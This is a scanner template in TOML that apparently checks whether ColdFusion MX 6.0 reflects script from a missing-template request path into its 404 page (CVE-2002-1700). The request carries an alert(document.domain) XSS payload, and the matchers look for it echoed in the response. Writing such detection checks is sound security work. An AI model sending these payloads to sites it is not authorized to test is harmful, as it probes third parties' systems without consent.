[info]
author = "ave"
description = "探测 ColdFusion MX（6.0）404 错误页面是否未对请求路径中的特殊字符进行过滤，导致模板缺失页将未转义内容回显，验证跨站脚本（XSS）漏洞。构造指向不存在模板的请求，其中嵌入 XSS 载荷，若响应正文在 404 错误信息中原样回显恶意脚本特证字符串，则判定存在漏洞。"
id = "POC-AVE-2002-0656"
name = "Macromedia ColdFusion MX Missing Template Cross-Site Scripting PoC"
severity = "medium"
tags = ["ave-2002-0656"]
vuln_id = [
    "CVE-2002-1700",
    "AVE-2002-0656",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/missing_ave_0656<script>alert(document.domain)</script>.cfm"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["missing_ave_0656<script>alert(document.domain)</script>"]

[[poc.requests.matchers]]
expect = true
status = [404]
type = "status"
